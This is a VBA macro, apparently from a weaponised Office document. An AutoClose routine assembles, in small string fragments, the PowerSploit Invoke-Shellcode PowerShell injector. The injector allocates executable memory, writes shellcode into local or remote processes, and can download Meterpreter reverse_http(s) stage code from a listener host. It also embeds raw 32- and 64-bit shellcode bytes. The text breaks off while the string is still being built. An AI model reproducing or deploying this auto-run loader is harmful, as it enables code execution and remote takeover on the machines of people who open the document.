Sub AutoClose()
        Vdm
End Sub

Public Function Vdm() As Variant
        Dim VK As String
        VK = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        VK = VK + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        VK = VK + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        VK = VK + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        VK = VK + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        VK = VK + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        VK = VK + "    $Shellcode,
    [Parameter( ParameterSetName ="
        VK = VK + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        VK = VK + "reter/reverse_http',
                  'windows/me"
        VK = VK + "terpreter/reverse_https',
                  Ignore"
        VK = VK + "Case = $True )]
    [String]
    $Payload = 'windo"
        VK = VK + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        VK = VK + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        VK = VK + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        VK = VK + " = $True,
                ParameterSetName = 'Meta"
        VK = VK + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        VK = VK + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        VK = VK + "datory = $True,
                ParameterSetName ="
        VK = VK + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        VK = VK + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        VK = VK + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        VK = VK + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        VK = VK + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        VK = VK + "sion\Internet Settings').'User Agent',
    [Parame"
        VK = VK + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        VK = VK + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        VK = VK + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        VK = VK + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        VK = VK + "$False,
    [Switch]
    $Force = $False
)
    Set"
        VK = VK + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        VK = VK + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        VK = VK + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        VK = VK + "meters['Payload'].Attributes |
            Where-O"
        VK = VK + "bject {$_.TypeId -eq [System.Management.Automation"
        VK = VK + ".ValidateSetAttribute]}
        foreach ($Payload "
        VK = VK + "in $AvailablePayloads.ValidValues)
        {
     "
        VK = VK + "       New-Object PSObject -Property @{ Payloads ="
        VK = VK + " $Payload }
        }
        Return
    }
    if "
        VK = VK + "( $PSBoundParameters['ProcessID'] )
    {
        "
        VK = VK + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        VK = VK + "-Null
    }
    function Local:Get-DelegateType
  "
        VK = VK + "  {
        Param
        (
            [OutputTyp"
        VK = VK + "e([Type])]
            [Parameter( Position = 0)]
"
        VK = VK + "            [Type[]]
            $Parameters = (Ne"
        VK = VK + "w-Object Type[](0)),
            [Parameter( Posit"
        VK = VK + "ion = 1 )]
            [Type]
            $ReturnT"
        VK = VK + "ype = [Void]
        )
        $Domain = [AppDomai"
        VK = VK + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        VK = VK + "t System.Reflection.AssemblyName('ReflectedDelegat"
        VK = VK + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        VK = VK + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        VK = VK + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        VK = VK + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        VK = VK + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        VK = VK + "der.DefineType('MyDelegateType', 'Class, Public, S"
        VK = VK + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        VK = VK + "egate])
        $ConstructorBuilder = $TypeBuilder"
        VK = VK + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        VK = VK + "ic', [System.Reflection.CallingConventions]::Stand"
        VK = VK + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        VK = VK + "mplementationFlags('Runtime, Managed')
        $Me"
        VK = VK + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        VK = VK + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        VK = VK + ", $Parameters)
        $MethodBuilder.SetImplement"
        VK = VK + "ationFlags('Runtime, Managed')
        Write-Outpu"
        VK = VK + "t $TypeBuilder.CreateType()
    }
    function Loc"
        VK = VK + "al:Get-ProcAddress
    {
        Param
        (
 "
        VK = VK + "           [OutputType([IntPtr])]
            [Par"
        VK = VK + "ameter( Position = 0, Mandatory = $True )]
       "
        VK = VK + "     [String]
            $Module,
            [Pa"
        VK = VK + "rameter( Position = 1, Mandatory = $True )]
      "
        VK = VK + "      [String]
            $Procedure
        )
  "
        VK = VK + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        VK = VK + ".GetAssemblies() |
            Where-Object { $_.G"
        VK = VK + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        VK = VK + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        VK = VK + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        VK = VK + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        VK = VK + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        VK = VK + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        VK = VK + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        VK = VK + "eropServices.HandleRef], [String]))
        $Kern3"
        VK = VK + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        VK = VK + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        VK = VK + "ndleRef = New-Object System.Runtime.InteropService"
        VK = VK + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        VK = VK + "Output $GetProcAddress.Invoke($null, @([System.Run"
        VK = VK + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        VK = VK + "ure))
    }
    function Local:Emit-CallThreadStub"
        VK = VK + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        VK = VK + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        VK = VK + "chitecture / 8
        function Local:ConvertTo-Li"
        VK = VK + "ttleEndian ([IntPtr] $Address)
        {
         "
        VK = VK + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        VK = VK + "           $Address.ToString("X$($IntSizePtr*2)") "
        VK = VK + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        VK = VK + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        VK = VK + " } }
            [System.Array]::Reverse($LittleEn"
        VK = VK + "dianByteArray)
            Write-Output $LittleEnd"
        VK = VK + "ianByteArray
        }
        $CallStub = New-Obj"
        VK = VK + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        VK = VK + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        VK = VK + "                   # MOV   QWORD RAX, &shellcode
 "
        VK = VK + "           $CallStub += ConvertTo-LittleEndian $Ba"
        VK = VK + "seAddr       # &shellcode
            $CallStub +="
        VK = VK + " 0xFF,0xD0                              # CALL  RA"
        VK = VK + "X
            $CallStub += 0x6A,0x00              "
        VK = VK + "                # PUSH  BYTE 0
            $CallSt"
        VK = VK + "ub += 0x48,0xB8                              # MOV"
        VK = VK + "   QWORD RAX, &ExitThread
            $CallStub +="
        VK = VK + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        VK = VK + "ead
            $CallStub += 0xFF,0xD0            "
        VK = VK + "                  # CALL  RAX
        }
        el"
        VK = VK + "se
        {
            [Byte[]] $CallStub = 0xB8"
        VK = VK + "                           # MOV   DWORD EAX, &she"
        VK = VK + "llcode
            $CallStub += ConvertTo-LittleEn"
        VK = VK + "dian $BaseAddr       # &shellcode
            $Cal"
        VK = VK + "lStub += 0xFF,0xD0                              # "
        VK = VK + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        VK = VK + "                        # PUSH  BYTE 0
           "
        VK = VK + " $CallStub += 0xB8                                "
        VK = VK + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        VK = VK + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        VK = VK + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        VK = VK + "                          # CALL  EAX
        }
  "
        VK = VK + "      Write-Output $CallStub
    }
    function Lo"
        VK = VK + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        VK = VK + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        VK = VK + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        VK = VK + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        VK = VK + "        Throw "Unable to open a process handle for"
        VK = VK + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        VK = VK + "lse
        if ($64bitCPU) # Only perform theses c"
        VK = VK + "hecks if CPU is 64-bit
        {
            $IsWo"
        VK = VK + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        VK = VK + "-Null
            if ((!$IsWow64) -and $PowerShell"
        VK = VK + "32bit)
            {
                Throw 'Unable"
        VK = VK + " to inject 64-bit shellcode from within 32-bit Pow"
        VK = VK + "ershell. Use the 64-bit version of Powershell if y"
        VK = VK + "ou want this to work.'
            }
            e"
        VK = VK + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        VK = VK + "  {
                if ($Shellcode32.Length -eq 0)"
        VK = VK + "
                {
                    Throw 'No s"
        VK = VK + "hellcode was placed in the $Shellcode32 variable!'"
        VK = VK + "
                }
                $Shellcode = $S"
        VK = VK + "hellcode32
            }
            else # 64-bit"
        VK = VK + " process
            {
                if ($Shellc"
        VK = VK + "ode64.Length -eq 0)
                {
            "
        VK = VK + "        Throw 'No shellcode was placed in the $She"
        VK = VK + "llcode64 variable!'
                }
            "
        VK = VK + "    $Shellcode = $Shellcode64
            }
      "
        VK = VK + "  }
        else # 32-bit CPU
        {
          "
        VK = VK + "  if ($Shellcode32.Length -eq 0)
            {
   "
        VK = VK + "             Throw 'No shellcode was placed in the"
        VK = VK + " $Shellcode32 variable!'
            }
           "
        VK = VK + " $Shellcode = $Shellcode32
        }
        $Remo"
        VK = VK + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        VK = VK + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        VK = VK + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        VK = VK + ")
        {
            Throw "Unable to allocate "
        VK = VK + "shellcode memory in PID: $ProcessID"
        }
   "
        VK = VK + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        VK = VK + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        VK = VK + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        VK = VK + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        VK = VK + "      {
            $CallStub = Emit-CallThreadStu"
        VK = VK + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        VK = VK + "    else
        {
            $CallStub = Emit-Ca"
        VK = VK + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        VK = VK + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        VK = VK + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        VK = VK + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        VK = VK + "(!$RemoteStubAddr)
        {
            Throw "Un"
        VK = VK + "able to allocate thread call stub memory in PID: $"
        VK = VK + "ProcessID"
        }
        $WriteProcessMemory.I"
        VK = VK + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        VK = VK + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        VK = VK + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        VK = VK + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        VK = VK + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        VK = VK + "  {
            Throw "Unable to launch remote thr"
        VK = VK + "ead in PID: $ProcessID"
        }
        $CloseHa"
        VK = VK + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        VK = VK + "on Local:Inject-LocalShellcode
    {
        if ($"
        VK = VK + "PowerShell32bit) {
            if ($Shellcode32.Le"
        VK = VK + "ngth -eq 0)
            {
                Throw 'N"
        VK = VK + "o shellcode was placed in the $Shellcode32 variabl"
        VK = VK + "e!'
                return
            }
         "
        VK = VK + "   $Shellcode = $Shellcode32
        }
        els"
        VK = VK + "e
        {
            if ($Shellcode64.Length -e"
        VK = VK + "q 0)
            {
                Throw 'No shell"
        VK = VK + "code was placed in the $Shellcode64 variable!'
   "
        VK = VK + "             return
            }
            $She"
        VK = VK + "llcode = $Shellcode64
        }
        $BaseAddre"
        VK = VK + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        VK = VK + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        VK = VK + "X)
        if (!$BaseAddress)
        {
          "
        VK = VK + "  Throw "Unable to allocate shellcode memory in PI"
        VK = VK + "D: $ProcessID"
        }
        [System.Runtime.I"
        VK = VK + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        VK = VK + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        VK = VK + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        VK = VK + "  if ($PowerShell32bit)
        {
            $Cal"
        VK = VK + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        VK = VK + "adAddr 32
        }
        else
        {
       "
        VK = VK + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        VK = VK + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        VK = VK + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        VK = VK + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        VK = VK + "X)
        if (!$CallStubAddress)
        {
      "
        VK = VK + "      Throw "Unable to allocate thread call stub.""
        VK = VK + "
        }
        [System.Runtime.InteropServices"
        VK = VK + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        VK = VK + "allStub.Length)
        $ThreadHandle = $CreateThr"
        VK = VK + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        VK = VK + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        VK = VK + "dHandle)
        {
            Throw "Unable to la"
        VK = VK + "unch thread."
        }
        $WaitForSingleObje"
        VK = VK + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        VK = VK + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        VK = VK + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        VK = VK + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        VK = VK + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        VK = VK + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        VK = VK + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        VK = VK + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        VK = VK + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        VK = VK + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        VK = VK + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        VK = VK + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        VK = VK + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        VK = VK + "  else
    {
        $64bitCPU = $false
    }
    "
        VK = VK + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        VK = VK + "l32bit = $true
    }
    else
    {
        $Power"
        VK = VK + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        VK = VK + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        VK = VK + "owerShell32bit) {
            $RootInvocation = $M"
        VK = VK + "yInvocation.Line
            $Response = $True
   "
        VK = VK + "         if ( $Force -or ( $Response = $psCmdlet.S"
        VK = VK + "houldContinue( "Do you want to launch the payload "
        VK = VK + "from x86 Powershell?",
                   "Attempt"
        VK = VK + " to execute 32-bit shellcode from 64-bit Powershel"
        VK = VK + "l. Note: This process takes about one minute. Be p"
        VK = VK + "atient! You will also see some artifacts of the sc"
        VK = VK + "ript loading in the other process." ) ) ) { }
    "
        VK = VK + "        if ( !$Response )
            {
          "
        VK = VK + "      Return
            }
            if ($MyInvo"
        VK = VK + "cation.BoundParameters['Force'])
            {
   "
        VK = VK + "             $Command = "function $($MyInvocation."
        VK = VK + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        VK = VK + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        VK = VK + "   }
            else
            {
              "
        VK = VK + "  $Command = "function $($MyInvocation.InvocationN"
        VK = VK + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        VK = VK + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        VK = VK + "
            $CommandBytes = [System.Text.Encoding"
        VK = VK + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        VK = VK + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        VK = VK + "           $Execute = '$Command' + " | $Env:windir"
        VK = VK + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        VK = VK + "oProfile -Command -"
            Invoke-Expression"
        VK = VK + " -Command $Execute | Out-Null
            Return
 "
        VK = VK + "       }
        $Response = $True
        if ( $F"
        VK = VK + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        VK = VK + "Do you know what you're doing?",
               "A"
        VK = VK + "bout to download Metasploit payload '$($Payload)' "
        VK = VK + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        VK = VK + "  if ( !$Response )
        {
            Return
 "
        VK = VK + "       }
        switch ($Payload)
        {
     "
        VK = VK + "       'windows/meterpreter/reverse_http'
        "
        VK = VK + "    {
                $SSL = ''
            }
    "
        VK = VK + "        'windows/meterpreter/reverse_https'
      "
        VK = VK + "      {
                $SSL = 's'
               "
        VK = VK + " [System.Net.ServicePointManager]::ServerCertifica"
        VK = VK + "teValidationCallback = {$True}
            }
     "
        VK = VK + "   }
        if ($Legacy)
        {
            $R"
        VK = VK + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        VK = VK + "
        } else {
            $CharArray = 48..57 "
        VK = VK + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        VK = VK + "         $SumTest = $False
            while ($Sum"
        VK = VK + "Test -eq $False)
            {
                $Ge"
        VK = VK + "neratedUri = $CharArray | Get-Random -Count 4
    "
        VK = VK + "            $SumTest = (([int[]] $GeneratedUri | M"
        VK = VK + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        VK = VK + "  }
            $RequestUri = -join $GeneratedUri
"
        VK = VK + "            $Request = "http$($SSL)://$($Lhost):$("
        VK = VK + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        VK = VK + "ew-Object Uri($Request)
        $WebClient = New-O"
        VK = VK + "bject System.Net.WebClient
        $WebClient.Head"
        VK = VK + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        VK = VK + "roxy)
        {
            $WebProxyObject = New-"
        VK = VK + "Object System.Net.WebProxy
            $ProxyAddre"
        VK = VK + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        VK = VK + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        VK = VK + "oxyServer
            if ($ProxyAddress)
         "
        VK = VK + "   {
                $WebProxyObject.Address = $Pr"
        VK = VK + "oxyAddress
                $WebProxyObject.UseDefa"
        VK = VK + "ultCredentials = $True
                $WebClientO"
        VK = VK + "bject.Proxy = $WebProxyObject
            }
      "
        VK = VK + "  }
        try
        {
            [Byte[]] $Sh"
        VK = VK + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        VK = VK + "}
        catch
        {
            Throw "$($Er"
        VK = VK + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        VK = VK + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        VK = VK + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        VK = VK + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        VK = VK + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        VK = VK + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        VK = VK + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        VK = VK + "                             0x52,0x0c,0x8b,0x52,0"
        VK = VK + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        VK = VK + "x31,0xc0,
                                  0xac,0"
        VK = VK + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        VK = VK + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        VK = VK + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        VK = VK + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        VK = VK + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        VK = VK + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        VK = VK + "x8b,
                                  0x01,0xd6,0"
        VK = VK + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        VK = VK + "x38,0xe0,0x75,0xf4,
                              "
        VK = VK + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        VK = VK + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        VK = VK + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        VK = VK + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        VK = VK + "                                  0x5b,0x5b,0x61,0"
        VK = VK + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        VK = VK + "xeb,0x86,0x5d,
                                  0"
        VK = VK + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        VK = VK + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        VK = VK + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        VK = VK + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        VK = VK + "                             0x80,0xfb,0xe0,0x75,0"
        VK = VK + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        VK = VK + "xd5,0x63,
                                  0x61,0"
        VK = VK + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        VK = VK + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        VK = VK + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        VK = VK + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        VK = VK + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        VK = VK + "                             0x20,0x48,0x8b,0x72,0"
        VK = VK + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        VK = VK + "x31,0xc0,
                                  0xac,0"
        VK = VK + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        VK = VK + "x41,0x01,0xc1,0xe2,0xed,
                         "
        VK = VK + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        VK = VK + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        VK = VK + "                        0x00,0x00,0x00,0x48,0x85,0"
        VK = VK + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        VK = VK + "x44,
                                  0x8b,0x40,0"
        VK = VK + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        VK = VK + "x8b,0x34,0x88,0x48,
                              "
        VK = VK + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        VK = VK + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        VK = VK + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        VK = VK + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        VK = VK + "                                  0x8b,0x40,0x24,0"
        VK = VK + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        VK = VK + "x40,0x1c,0x49,
                                  0"
        VK = VK + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        VK = VK + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        VK = VK + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        VK = VK + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        VK = VK + "                             0x59,0x5a,0x48,0x8b,0"
        VK = VK + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        VK = VK + "x00,0x00,
                                  0x00,0"
        VK = VK + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        VK = VK + "x00,0x41,0xba,0x31,0x8b,
                         "
        VK = VK + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        VK = VK + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        VK = VK + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        VK = VK + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        VK = VK + "x47,
                                  0x13,0x72,0"
        VK = VK + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        VK = VK + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        VK = VK + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        VK = VK + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        VK = VK + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        VK = VK + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        VK = VK + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        VK = VK + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        VK = VK + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        VK = VK + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        VK = VK + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        VK = VK + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        VK = VK + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        VK = VK + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        VK = VK + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        VK = VK + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        VK = VK + "ernel32.dll WriteProcessMemory
        $WriteProce"
        VK = VK + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        VK = VK + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        VK = VK + "()) ([Bool])
        $WriteProcessMemory = [System"
        VK = VK + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        VK = VK + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        VK = VK + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        VK = VK + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        VK = VK + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        VK = VK + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        VK = VK + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        VK = VK + "eateRemoteThread = [System.Runtime.InteropServices"
        VK = VK + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        VK = VK + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        VK = VK + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        VK = VK + " CloseHandle
        $CloseHandleDelegate = Get-De"
        VK = VK + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        VK = VK + "le = [System.Runtime.InteropServices.Marshal]::Get"
        VK = VK + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        VK = VK + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        VK = VK + ".ShouldContinue( 'Do you wish to carry out your ev"
        VK = VK + "il plans?',
                 "Injecting shellcode "
        VK = VK + "injecting into $((Get-Process -Id $ProcessId).Proc"
        VK = VK + "essName) ($ProcessId)!" ) )
        {
            "
        VK = VK + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        VK = VK + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        VK = VK + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        VK = VK + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        VK = VK + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        VK = VK + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        VK = VK + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        VK = VK + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        VK = VK + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        VK = VK + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        VK = VK + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
